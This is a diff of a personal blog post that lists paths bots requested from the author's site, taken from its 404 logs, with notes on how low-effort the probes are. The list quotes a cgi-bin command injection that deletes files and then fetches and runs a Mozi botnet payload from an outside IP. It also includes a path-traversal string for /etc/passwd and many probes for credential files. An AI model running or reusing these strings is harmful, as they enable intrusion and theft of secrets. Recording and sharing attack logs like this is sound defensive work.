@@ -29,7 +29,12 @@ of it. Surprise surprise, a significant portion of these are attacks:
   - `blog.zip`
   - `.well-known/acme-challenge`
   - `..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd`
+  - `cgi-bin`
   - `/cgi-bin/;cd${IFS}/var/tmp;rm${IFS}-rf${IFS}*;${IFS}wget${IFS}http://103.170.53.6:51978/Mozi.m;${IFS}sh${IFS}/var/tmp/Mozi.m`
+  - `/setup/eureka_info`
+  - `sse`
+  - `uploads`
+  - `security.txt`
 - php:
   - `phpMyAdmin`
   - `phpmyadmin`
@@ -37,12 +42,22 @@ of it. Surprise surprise, a significant portion of these are attacks:
   - `txets.php`
   - `database.php`
   - `rip.php`
-  - `admin.php`
   - `class-t.api.php`
+  - `admin.php`
+  - `adminfuns.php`
   - `admin-funs.php`
   - `ioxi-o.php`
   - `goods.php`
   - `class-t.api.php`
+  - `autoload_classmap.php`
+  - `chosen.php`
+  - `xmlrpc.php`
+  - `z.php`
+  - `inputs.php`
+  - `d12.php`
+  - `lm15.php`
+  - `144.php`
+  - `6kDPjgFTmvS.php`
 - Wordpress:
   - `wp-login.php`
   - `wp-good.php`
@@ -62,6 +77,7 @@ of it. Surprise surprise, a significant portion of these are attacks:
       - `wp-file-manager`
       - `ultimate-member`
       - `litespeed-cache`
+      - `WordPressCore`
   - `wp-admin/`
     - `network`
 - Backups:
@@ -81,16 +97,48 @@ of it. Surprise surprise, a significant portion of these are attacks:
     - `backup.tar.gz`
     - `backup.sql.gz`
 - Misc.:
+  - `main.json`
+  - `config.json`
+  - `deployment-config.json`
+  - `.vscode/sftp.json`
   - `sftp-config.json`
   - `mysql.sql`
+  - `Telerik.Web.UI.WebResource.axd`
+  - `sftp-config.json`
+  - `database.sql`
+  - `db.sql`
+  - `dump.sql`
+  - `.netrc`
+  - `.htpasswd`
+  - `secrets.json`
+  - `.aws/credentials`
+  - `.env.backup`
+  - `.env.production`
+  - `.env.staging`
+  - `.env.local`
+  - `gcloud-service-key.json`
+  - `google-credentials.json`
+  - `.pgpass`
+  - `.svn/wc.db`
+  - `serviceAccountKey.json`
+  - `debug/vars`
 
+> [!NOTE]  
 > Edit: I'll try to keep this updated over time, if I find anything new. These
 > are all from recent logs. Historically, there's been more variance.
 
+> [!NOTE]  
 > Edit: For a while the logged 404 pages were limited to a subset of /blog. This
 > has been fixed, and I now see an even scarier list of pages trying to be
 > accessed. I think a fun next-step will be to do some lookups on the IPs trying
 > to access these pages.
+
+> [!NOTE]  
+> Edit: Considering how low-effort some of these attacks are (e.g., looking for
+> aws/gcp credentials on a system hosted by akamai) I would expect bots to just
+> blast 1k endpoints at once, instead of spacing them out like I see in the
+> logs. Perhaps this is to avoid detection from various providers like
+> CloudFlare?
 
 My site used to get much more bot traffic, as identified by the error rate on
 these logs. Since then, my [robots.txt](/robots.txt) has become significantly
